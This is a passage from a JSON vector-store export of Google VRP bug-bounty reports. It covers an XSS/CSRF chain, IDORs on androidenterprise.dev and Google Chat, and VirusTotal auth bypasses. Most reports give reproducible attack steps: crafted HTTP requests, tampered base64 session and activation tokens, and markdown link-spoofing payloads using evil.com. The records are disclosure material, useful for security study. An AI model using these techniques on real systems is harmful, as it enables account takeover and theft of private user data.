CSRF to create a meaningful impact.\r\nReproduction steps\r\n\u2193\r\nRun the python code (Start the service)\r\nVisit the service and check /example_task_handler\r\nOnce you get the \"Method not allowed\" error, intercept the  request and change the method type (GET to POST)\r\nNow we can trigger the XSS payload\r\nChain it with CSRF\r\nProof of Concept\r\nhttps://drive.google.com/file/d/17kjfdqf5iG8VMktHqIsy9IzU8ZwR8cHD/view?usp=sharing\r\nWhile chaining the bug XSS with CSRF, change the Content-Type: application/x-www-form-urlencoded to text/html\r\nCSRF PoC\r\nVideo Link: >\r\nhttps://drive.google.com/file/d/17kjfdqf5iG8VMktHqIsy9IzU8ZwR8cHD/view?usp=sharing\r\nConclusion\r\nSanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches.\r\nCSRF Prevention\r\nI hope it helps!\r\nCheers,\r\nAttack scenario\r\nThe attacker causes the victim user to carry out an action unintentionally via exploiting CSRF\r\nThe attacker can execute malicious scripts on victim's browser: XSS\r\nThis vulnerability can chain to create critical security issues\r\nAffect the trust of the product\r\n& Many more\r\nRegards,\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2983, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "e06f32fa-c130-4197-91e7-086a8d7e31c7": {"__data__": {"id_": "e06f32fa-c130-4197-91e7-086a8d7e31c7", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175705_938739.txt", "file_name": "20250408_175705_938739.txt", "file_type": "text/plain", "file_size": 3177, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "13cc907c-74a3-4fc1-8a4c-24490254910d", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175705_938739.txt", "file_name": "20250408_175705_938739.txt", "file_type": "text/plain", "file_size": 3177, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "c40363b9c648a24874ddd6c3781795b16af721a0640cdbd07dda8e50d64d98b9", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nAccess private user uploads via IDOR at androidenterprise.dev (including config files, passwords, emails, names, etc.)\r\nReported by:\r\nBen Chinoy\r\nGoogle VRP\r\ntriaged\r\n00:55 | Aug 19, 2022\r\naccepted\r\n00:56 | Aug 19, 2022\r\nfixed\r\n22:17 | Sep 11, 2022\r\nreward decided\r\n$500\r\nSummary:\r\nAccess private user uploads via IDOR at androidenterprise.dev (including config files, passwords, emails, names, etc.)\r\nProduct:\r\nOther - Google VRP\r\nURL:\r\nhttps://www.androidenterprise.dev/s/contentdocument/{{insert_id}}\r\nVulnerability type:\r\nSensitive data exposure\r\nDetails\r\nHello, Hope you are doing well. I wanted to report the following issues.\r\n1) There is an IDOR vulnerability at:\r\nhttps://www.androidenterprise.dev/s/contentdocument/{{insert_id}}\r\nthat allows any registered user to access another private user's files.\r\n2) There is also a vulnerability in the API that allows for the object called \"ContentDocument\" to be queried by any registered user. A malicious user can combine these two vulnerabilities (i.e. query the object, get the list of IDs, and call them using the above URL to access all private uploaded files on the site.\r\nThe documents available are specifically specified as private but are available if you query them directly on the site. For example, once you login, you can visit the below URLs to see other user files:\r\nhttps://www.androidenterprise.dev/s/contentdocument/[REDACTED_ID]\r\n- user uploaded json config file that includes network config info for the user. You can download it directly here:\r\nhttps://www.androidenterprise.dev/sfc/servlet.shepherd/document/download/[REDACTED_ID]?operationContext=S1\r\nhttps://www.androidenterprise.dev/s/contentdocument/[REDACTED_ID]\r\n- mp4 file of user interacting with their device\r\nhttps://www.androidenterprise.dev/s/contentdocument/[REDACTED_ID]\r\n- user account info\r\nhttps://www.androidenterprise.dev/s/contentdocument/[REDACTED_ID]\r\n- user imei numbers\r\nhttps://www.androidenterprise.dev/s/contentdocument/[REDACTED_ID]\r\n- user serial number, imei number, etc.\r\nhttps://www.androidenterprise.dev/s/contentdocument/[REDACTED_ID]\r\n- user stack track includes admin password on page 17\r\nhttps://www.androidenterprise.dev/s/contentdocument/[REDACTED_ID]\r\n- user case info\r\nFor each of these files, on the right side, you can see that they are only shared with one person (the owner of the file) so I should not have access to these and any random user definitely should not be able to access these. As all of these files (there are a lot of others) are user generated, the content varies and can be completely different depending on what the user has uploaded.\r\nThe ID of every user file is available to enumerate via the API via the ContentDocument object, so a malicious user can just iterate through them to download all private user files on the site.\r\nAttack scenario\r\nAny registered user can exploit this and access another user's private information. This includes:\r\nConfig information\r\nStack traces\r\nVideos of users showing issues with their devices\r\nOther user info/passwords for their networks\r\nEmails and names etc.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3161, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "69608c5c-f945-465d-bfd5-eb32bde90c4c": {"__data__": {"id_": "69608c5c-f945-465d-bfd5-eb32bde90c4c", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_024120.txt", "file_name": "20250408_175708_024120.txt", "file_type": "text/plain", "file_size": 4089, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "62371b0d-34fc-4266-9a71-71ba1dd09326", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_024120.txt", "file_name": "20250408_175708_024120.txt", "file_type": "text/plain", "file_size": 4089, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "4c1f722a1376615cf88488a2b412b789898851fb6a98bcb108e5f857429f8d0a", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "4dff9c3c-60a5-4bbe-be59-301597f7f327", "node_type": "1", "metadata": {}, "hash": "930811fbd77ebaab190135a3ba8a08d8f78798061b4267ae976ef937de2503cf", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nThe bug in VirusTotal's sessions handle mechanism allows to get access to any user account\r\nReported by:\r\nChip\r\nGoogle VRP\r\ntriaged\r\n07:26 | Jul 12, 2022\r\naccepted\r\n04:40 | Jul 15, 2022\r\nfixed\r\n10:42 | Jul 28, 2022\r\nreward decided\r\n$500\r\nSummary:\r\nThe bug in VirusTotal's sessions handle mechanism allows to get access to any user account\r\nProduct:\r\nhttps://www.virustotal.com/\r\nVulnerability type:\r\nAuth Bypass\r\nDetails\r\nIn order to perform exploitation of the bug an attacker needs VT account, say [REDACTED_EMAIL]. After logging he obtains the\r\nVT_SESSION_ID\r\ncookie:\r\n[REDACTED]\r\nDecode it using base64:\r\n[REDACTED]||1657472422||e39901b640019bfe33dfd0f4a6920bf7af4468cb82c415bb0d8baecce9f1a36Yg\r\n.\r\nSeems, it has format\r\nb64_serialized_string||timestamp||control_hashsum\r\n.\r\nLet's see at the\r\nb64_serialized_string\r\nof another user with email [REDACTED_EMAIL]:\r\n[REDACTED]\r\n.\r\nIf you decode these\r\nb64_serialized_string\r\n's (add\r\n=\r\nto the end of the strings before decoding) and compare it, you will see that they differ only in four bytes (see serialized_string_compare.png). I also saw cases, where were 5 distinct bytes.\r\nSo, an attacker can bruteforce these 4-5 bytes in order to get valid\r\nb64_serialized_string\r\n's. The problem is that an attacker needs to construct a valid\r\nVT_SESSION_ID\r\n. It is possible with the user registration mechanism.\r\nImagine, that an attacker brutrforced\r\nb64_serialized_string\r\n=\r\n[REDACTED]\r\n.  He can create new user with any email and username =\r\n[REDACTED]\r\n.  I did it using account with email\r\n[REDACTED_EMAIL]\r\n(account_creation.PNG).\r\nLook at the confirmation link was sent to email:\r\nhttps://www.virustotal.com/gui/account-activation/[REDACTED]\r\n.\r\nDecode it with base64:\r\n[REDACTED]||1657473711||a29ee9e51846b45733518ba6b2a97c88cf97e2b5fad5b8123cabc3e5ecd385fNw\r\n.\r\nYou can see our tampered\r\nb64_serialized_string\r\nwith the same format as\r\nVT_SESSION_ID\r\nand with a valid sign.\r\nTo check if this obtained\r\nVT_SESSION_ID\r\nis tied to any user session an attacker can perform this request:\r\nGET /ui/user_notifications HTTP/2\r\nHost: www.virustotal.com\r\nCookie: VT_SESSION_ID=[REDACTED]\r\nX-Vt-Anti-Abuse-Header: 0\r\nUser-Agent: 0\r\nAccept-Ianguage: 0\r\nX-Tool: 0\r\nReferer: http://127.0.0.1\r\nUsing provided headers it is possible to skip checks of\r\nVT_SESSION_HASH\r\ncookie and\r\nX-Session-Hash\r\n,\r\nX-Vt-Anti-Abuse-Header\r\nheaders. The interesting thing is that behavior depends on the\r\nReferrer\r\nheader.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2497, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "4dff9c3c-60a5-4bbe-be59-301597f7f327": {"__data__": {"id_": "4dff9c3c-60a5-4bbe-be59-301597f7f327", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_024120.txt", "file_name": "20250408_175708_024120.txt", "file_type": "text/plain", "file_size": 4089, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "62371b0d-34fc-4266-9a71-71ba1dd09326", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_024120.txt", "file_name": "20250408_175708_024120.txt", "file_type": "text/plain", "file_size": 4089, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "4c1f722a1376615cf88488a2b412b789898851fb6a98bcb108e5f857429f8d0a", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "69608c5c-f945-465d-bfd5-eb32bde90c4c", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_024120.txt", "file_name": "20250408_175708_024120.txt", "file_type": "text/plain", "file_size": 4089, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "fde7bdce3946c513ecc794ccc0fe05293dfd1e04b6dafae63a6d69fbf5b5d22f", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "You can see our tampered\r\nb64_serialized_string\r\nwith the same format as\r\nVT_SESSION_ID\r\nand with a valid sign.\r\nTo check if this obtained\r\nVT_SESSION_ID\r\nis tied to any user session an attacker can perform this request:\r\nGET /ui/user_notifications HTTP/2\r\nHost: www.virustotal.com\r\nCookie: VT_SESSION_ID=[REDACTED]\r\nX-Vt-Anti-Abuse-Header: 0\r\nUser-Agent: 0\r\nAccept-Ianguage: 0\r\nX-Tool: 0\r\nReferer: http://127.0.0.1\r\nUsing provided headers it is possible to skip checks of\r\nVT_SESSION_HASH\r\ncookie and\r\nX-Session-Hash\r\n,\r\nX-Vt-Anti-Abuse-Header\r\nheaders. The interesting thing is that behavior depends on the\r\nReferrer\r\nheader.\r\nIf the request is succeeded, in response you can see links with the username ([REDACTED_USERNAME]):\r\n\"links\": {\r\n\"self\": \"\r\nhttps://www.virustotal.com/ui/users/[REDACTED_USERNAME]/notifications?limit=10\"\r\n,\r\n\"next\": \"\r\nhttps://www.virustotal.com/ui/users/[REDACTED_USERNAME]1notifications?cursor=CjsSNWoRc352aXJ1c3RvdGFsY2xvdWRyIAsSEFVzZXJOb3RpZmljYXRpb24iCjIwMjAxMTI2MDEMGAAgAQ%3D%3D&limit=10\"\r\n}\r\nAnd finally, an attacker can perform this request to obtain secret user data (access token):\r\nGET /ui/users/[REDACTED_USERNAME] HTTP/2\r\nHost: www.virustotal.com\r\nCookie: VT_SESSION_ID=[REDACTED]\r\nX-Vt-Anti-Abuse-Header: 0\r\nUser-Agent: 0\r\nAccept-Ianguage: 0\r\nX-Tool: 0\r\nReferer: http://127.0.0.1\r\n{\r\n\"data\": {\r\n\"attributes\": {\r\n\"status\": \"active\",\r\n\"first_name\": \"[REDACTED_USERNAME]\",\r\n\"apikey\": \"\r\n444b040499ac70a7ab8985105d139500782fa0e2270d52626036d3470c464d3e\r\n\"\r\nSo, an attacker can use this technique to compromise the mass of the VirusTotal accounts. He can create his email server to generate unlimited emails for accounts registration. The only complexity is to bypass the rate limit and Google-captcha while performing user registration requests, but it is possible with the 3rd party services. Other mentioned requests are not rate-limited.\r\nAnd of course this attack may be automated.\r\nAttack scenario\r\nAny attacker can exploit it in order to compromise the mass of VT accounts. Then he can steal sensitive users data like private hunting rules or graphs, also, he can use VT API spending victim's quota, including VT Enterprise functionality.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 1870, "end_char_idx": 4073, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "04c70715-9371-4611-b3c8-2358b78b52aa": {"__data__": {"id_": "04c70715-9371-4611-b3c8-2358b78b52aa", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_071438.txt", "file_name": "20250408_175708_071438.txt", "file_type": "text/plain", "file_size": 2266, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "a859e5e9-8eaf-4a5c-b325-8e83563b3126", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_071438.txt", "file_name": "20250408_175708_071438.txt", "file_type": "text/plain", "file_size": 2266, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "805e67e459acc392cb5bb7aadc6dcd1c668dc4d1c3e38646c9fc8472fc46e06b", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nIDOR allow to remove any Members in  Google chat  Spaces\r\nReported by:\r\nVivek Muthuswamy\r\nGoogle VRP\r\ntriaged\r\n19:14 | Jul 4, 2022\r\naccepted\r\n21:44 | Jul 4, 2022\r\nfixed\r\n17:15 | Aug 14, 2022\r\nreward decided\r\n$3,133.70\r\nGoogle comment\r\nFor the vulnerability described in this report to be exploited, the attacker has to be a member of the space. An attacker cannot remove a manager/member from a space that they are not a member of.\r\nSummary:\r\nIDOR allow to remove any Members in  Google chat  Spaces\r\nThe vulnerability is known to third parties!\r\nProduct:\r\nGoogle Chat\r\nURL:\r\nhttps://mail.google.com/chat/u/0/#chat/space\r\nVulnerability type:\r\nPrivilege Escalation\r\nDetails\r\nWhen using Google Spaces, the creator automatically becomes the Space Manager who can remove and add participants.\r\nDue to the IDOR vulnerability, an attacker could be able to remove the Space Manager from a Space and remove any member from any Space.\r\nThis vulnerability consists in:\r\nPOST /u/0/_/DynamiteWebUi/data/batchexecute?rpcids=itoCId&source-path=%2Fu%2F0%2Fmole%2Fworld&f.sid=2214863011575308312&bl=boq_dynamiteuiserver_20220624.01_p0&hl=en&soc-app=1&soc-platform=1&soc-device=1&_reqid=14582833&rt=c HTTP/2\r\nHost: chat.google.com\r\nBy changing the Space ID and user ID , an attacker could remove any member or Manager from Space.\r\nSteps to reproduce :\r\nGo to\r\nhttps://mail.google.com/chat/u/0/#chat/space/xxxxx\r\nfrom the attacker's account .\r\nOpen \" View Members\" and click \"Remove from space\"\r\nStart intercepting the post request and you'll get\r\n[[[\"itoCId\",\"[[],[\\\"space/AAAAuypwSbs\\\",\\\"AAAAuypwSbs\\\",2],4,[[\\\"user/105599426893724266332\\\",null,\\\"105599426893724266332\\\",null,[\\\"105599426893724266332\\\",\\\"human/105599426893724266332\\\",0],\\\"user/human/105599426893724266332\\\"]],null,null,[]]\",null,\"generic\"]]]&at=ALDO5-NfcbsvAFhduORqxN84kZGt:1656869432201&\r\n\r\n Space ID : AAAAuypwSbs \r\n\r\n User ID : 105599426893724266332\r\nReplace the User ID with the Space Manager ID, then send the request.\r\nThe Space Manager will be kicked out of the space.\r\nBy changing the space ID and user ID , we can remove any space member in Google chat\r\nAttack scenario\r\nA malicious actor can remove any space member.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2250, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "8535adc3-044d-4220-89bd-6b718e0aa71c": {"__data__": {"id_": "8535adc3-044d-4220-89bd-6b718e0aa71c", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_102846.txt", "file_name": "20250408_175708_102846.txt", "file_type": "text/plain", "file_size": 2662, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "0612b6c0-3f76-4425-bbea-8928da2a906f", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_102846.txt", "file_name": "20250408_175708_102846.txt", "file_type": "text/plain", "file_size": 2662, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "226e3efcd2d06795afb764cb867d61572bd16fe22479eecfae9ec3d2d4e5393c", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nA bug in VirusTotal allows to sign up with an arbitrary email address, which results in access to a private enterprise VT group\r\nReported by:\r\nChip\r\nGoogle VRP\r\ntriaged\r\n17:15 | Jul 3, 2022\r\naccepted\r\n18:15 | Jul 6, 2022\r\ntriaged\r\n20:22 | Apr 21, 2023\r\naccepted\r\n20:26 | Apr 21, 2023\r\nfixed\r\n15:54 | Apr 30, 2023\r\nreward decided\r\n$1,500\r\nSummary:\r\nA bug in VirusTotal allows to sign up with an arbitrary email address, which results in access to a private enterprise VT group\r\nProduct:\r\nVirusTotal\r\nURL:\r\nhttps://www.virustotal.com/ui/signup/confirm\r\nVulnerability type:\r\nAuth Bypass\r\nDetails\r\nSign up with an arbitrary email address you don't have access to, for example:\r\nEmail:\r\nvictim@targetdomain.com\r\nUsername:\r\nvictim\r\nPassword:\r\nX#|>.Dl\\Ec^8joW#\r\nSign up with email address you have access to and with specially crafted username:\r\nEmail:\r\nyitadev549@jrvps.com\r\nUsername:\r\nvictim1\r\nFind account activation email was sent to\r\nyitadev549@jrvps.com\r\n, pay attention at the activation link:\r\nhttps://www.virustotal.com/gui/account-activation/dmljdGltMXx8MTY1Njc1NDMyN3x8MzM1MmRjNzMxMTE1ZTliOTkzZGIyODY3ZjIyOTg0MmUxOGUyNTI3YWFmNDQ1ZjViYzkxYThmMGVlZDRjNWIxYw\r\nBase64 decode string:\r\ndmljdGltMXx8MTY1Njc1NDMyN3x8MzM1MmRjNzMxMTE1ZTliOTkzZGIyODY3ZjIyOTg0MmUxOGUyNTI3YWFmNDQ1ZjViYzkxYThmMGVlZDRjNWIxYw\r\nvictim1||1656754327||3352dc731115e9b993db2867f229842e18e2527aaf445f5bc91a8f0eed4c5b1c\r\n.\r\nIt has format\r\nusername||timestamp||token\r\n.\r\nTransform decoded string to\r\nvictim||11656754327||3352dc731115e9b993db2867f229842e18e2527aaf445f5bc91a8f0eed4c5b1c\r\n.\r\nI moved\r\n1\r\nfrom username to timestamp. Encode it with Base64.\r\nOpen activation link with new tampered Base64 string in the browser:\r\nhttps://www.virustotal.com/gui/account-activation/dmljdGltfHwxMTY1Njc1NDMyN3x8MzM1MmRjNzMxMTE1ZTliOTkzZGIyODY3ZjIyOTg0MmUxOGUyNTI3YWFmNDQ1ZjViYzkxYThmMGVlZDRjNWIxYw==\r\nAccount with username\r\nvictim\r\n, email\r\nvictim@targetdomain.com\r\nand password\r\nX#|>.Dl\\Ec^8joW#\r\nwill be successfully activated!\r\nThis bug leads to access to private enterprise groups, for example, I have tested that it is possible to get access to Kaspersky's enterprise group with email [REDACTED_EMAIL] and password [REDACTED_PASSWORD]. Be sure that I have not performed any violations with this account.\r\nAttack scenario\r\nAn attacker can use it to enumerate persons working in the company (enterprise group list), and for using quotas the company paid for, like downloading files or creating retrohunt rules. He can sell accounts with these wide permissions.\r\nIt will lead to complaints from your corporate users.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2646, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "29b04c9b-5e82-4da2-8ac7-6792948fc9b8": {"__data__": {"id_": "29b04c9b-5e82-4da2-8ac7-6792948fc9b8", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_149968.txt", "file_name": "20250408_175708_149968.txt", "file_type": "text/plain", "file_size": 4037, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "37f5dcfc-7cb9-45e2-acdb-7551e0e4ac64", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_149968.txt", "file_name": "20250408_175708_149968.txt", "file_type": "text/plain", "file_size": 4037, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "f4ca3a7bf599a5fd1320053931302e044aa00bff9112cfd76cc83b25ac6dc3c1", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "8bf15800-93b6-402d-8f7f-b20006704b7a", "node_type": "1", "metadata": {}, "hash": "f1688a0cbfe1e0fd406af584e525e67f977250509e36acb6d1de08dfce755789", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nMultiple issues with Markdown and URL parsing\r\nReported by:\r\nAmgad Esam\r\nGoogle VRP\r\ntriaged\r\n18:00 | May 12, 2022\r\nclosed\r\n18:01 | May 12, 2022\r\ntriaged\r\n04:15 | May 13, 2022\r\naccepted\r\n23:17 | May 13, 2022\r\nfixed\r\n18:45 | May 27, 2022\r\nreward decided\r\n$100\r\nSummary:\r\nMultiple issues with Markdown and URL parsing\r\nProduct:\r\nGoogle\r\nURL:\r\nissuetracker.google.com\r\nVulnerability type:\r\nOther\r\nDetails\r\nHi Google,\r\nI would like to report an issue where attackers can trick Google Security Triage Team by manipulating with links in markdown fields.\r\nIssue tracker\r\nis also vulnerable to tab nabbing, this can be dangerous since  the triage team may be affected by this attack.\r\nProof of concept:\r\nftp://evil.com\r\nhttp://2130706433\r\n[POC](http:2130706433)\r\n-> Result  =\r\nPOC\r\n[POC2](ftp:evil.com)\r\n-> Result  =\r\nPOC2\r\nwww.google.com%2Famgad-esam%3Fpoc=@https://evil.com\r\n-> Result  =\r\nftp://evil.com\r\n[2130706433.google.com](http:2130706433/.google.com)\r\n-> Result =\r\n2130706433.google.com\r\nftp://google.com:\\@evil.com\r\n-> Result  =\r\nftp://evil.com\r\nhttp://google.com:\\@2130706433\r\n-> Result =\r\nhttp://127.0.0.1\r\n<ftp://google.com@evil.com>\r\n-> Result =\r\nftp://evil.com\r\n<ftp:/google.com@evil.com>\r\n-> Result =\r\nftp://evil.com\r\n[http://google.com](ftp://google.com@evil.com)\r\n-> Result =\r\nftp://evil.com\r\n[http://google.com](ftp:/google.com@evil.com)\r\n-> Result =\r\nftp://evil.com\r\n[google.com](ftp:%67%6f%6f%67%6c%65%2e%63%6f%6d@%65%76%69%6c%2e%63%6f%6d)\r\n-> Result =\r\nftp://evil.com\r\nAttack scenario\r\nAny security researcher might be able to trick someone of the triage team\r\nPlanned disclosure date:\r\nThu Jun 30 2022 00:00:00 GMT+0200 (Eastern European Standard Time)\r\nSteps to reproduce & Proof of concept:\r\nPlease open\r\nissue tracker\r\n.\r\nOpen any issue, let's take our report as an example:\r\nProof of concept\r\n.\r\nAt Markdown field, Inject the following payloads:\r\nftp://evil.com\r\nBypass External link warning.\r\nMarkdown field trusts and accepts the ftp protocol (I noticed that this payload is not accepted in [HackerOne] (\r\nhttps://hackerone.com\r\n) Markdown fields, That's why I think this is should be a bug.)\r\nWe are going to exploit this later with another tricky method.\r\nPOC:\r\nftp://evil.com\r\n.\r\nPOC2:\r\n[POC2](ftp:evil.com)\r\n-> Result  =\r\nPOC2\r\n.\r\nhttp://2130706433\r\nBypass External link warning.\r\nMarkdown field converts equivalent integers to IP addresses.\r\nWe are going to exploit this later with another tricky method.\r\nPOC3:\r\nhttp://2130706433\r\nPOC4:\r\n[POC](http:2130706433)\r\n-> Result  =\r\nPOC\r\nwww.google.com%2Famgad-esam%3Fpoc=@https://evil.com\r\nI am not able to reproduce it now, not sure if I did something wrong or you fixed it!\r\n2130706433.google.com\r\n. + As mentioned above, since integer values are presented as IP addresses; Attackers might be able to trick a team member into thinking that 2130706433/ is a subdomain of example.com.\r\nPOC5:\r\n[2130706433.google.com](http:2130706433/.google.com)\r\n-> Result =\r\n2130706433.google.com\r\nThe rest of the payloads are the same idea but in different methods.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3074, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "8bf15800-93b6-402d-8f7f-b20006704b7a": {"__data__": {"id_": "8bf15800-93b6-402d-8f7f-b20006704b7a", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_149968.txt", "file_name": "20250408_175708_149968.txt", "file_type": "text/plain", "file_size": 4037, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "37f5dcfc-7cb9-45e2-acdb-7551e0e4ac64", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_149968.txt", "file_name": "20250408_175708_149968.txt", "file_type": "text/plain", "file_size": 4037, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "f4ca3a7bf599a5fd1320053931302e044aa00bff9112cfd76cc83b25ac6dc3c1", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "29b04c9b-5e82-4da2-8ac7-6792948fc9b8", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_149968.txt", "file_name": "20250408_175708_149968.txt", "file_type": "text/plain", "file_size": 4037, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "1315cef8c844055ad059fc6dab6f798c9e979e93f2dadd84ee0b57bb2921e992", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Markdown field converts equivalent integers to IP addresses.\r\nWe are going to exploit this later with another tricky method.\r\nPOC3:\r\nhttp://2130706433\r\nPOC4:\r\n[POC](http:2130706433)\r\n-> Result  =\r\nPOC\r\nwww.google.com%2Famgad-esam%3Fpoc=@https://evil.com\r\nI am not able to reproduce it now, not sure if I did something wrong or you fixed it!\r\n2130706433.google.com\r\n. + As mentioned above, since integer values are presented as IP addresses; Attackers might be able to trick a team member into thinking that 2130706433/ is a subdomain of example.com.\r\nPOC5:\r\n[2130706433.google.com](http:2130706433/.google.com)\r\n-> Result =\r\n2130706433.google.com\r\nThe rest of the payloads are the same idea but in different 